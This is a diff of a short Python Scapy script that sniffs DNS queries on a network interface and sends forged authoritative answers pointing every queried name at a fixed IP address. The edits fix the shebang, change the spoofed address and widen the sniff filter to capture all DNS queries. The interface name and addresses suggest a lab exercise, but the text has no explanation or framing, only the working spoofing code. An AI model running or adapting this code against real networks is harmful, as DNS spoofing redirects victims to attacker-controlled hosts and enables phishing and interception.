@@ -1,4 +1,4 @@
-#/usr/bin/env python3
+#!/usr/bin/env python3
 
 from scapy.all import *
 from scapy.layers.dns import DNS, DNSQR, DNSRR
@@ -11,10 +11,10 @@ def spoof_dns(pkt):
         print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
         ip = IP(dst=pkt[IP].src, src=pkt[IP].dst) # Swap the source and destination IP addresses
         udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) # Swap the source and destination ports
-        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='10.9.0.153') # Create an answer record
+        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.5') # Create an answer record
         dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=Anssec) # Create a DNS packet
         spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
         send(spoofpkt)
 
-myFilter = "udp port 53 and ip dst" + NS_NAME
+myFilter = "udp dst port 53"
 pkt = sniff(iface='br-c1e3c02a8177', filter=myFilter, prn=spoof_dns)
